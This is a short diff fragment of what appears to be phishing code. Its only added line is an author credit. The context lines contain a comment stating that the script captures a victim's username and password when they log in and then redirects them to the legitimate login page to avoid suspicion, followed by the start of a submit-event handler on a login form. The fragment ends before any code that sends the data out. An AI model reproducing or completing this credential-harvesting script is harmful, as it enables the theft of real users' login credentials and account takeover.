@@ -1,3 +1,4 @@
+// Coded by: QyFashae
 <script>
 // In this script we captures the victim's username and password when they attempt to log in, then redirects them to the legitimate login page to avoid suspicion.
     document.getElementById('login-form').addEventListener('submit', function(event) {
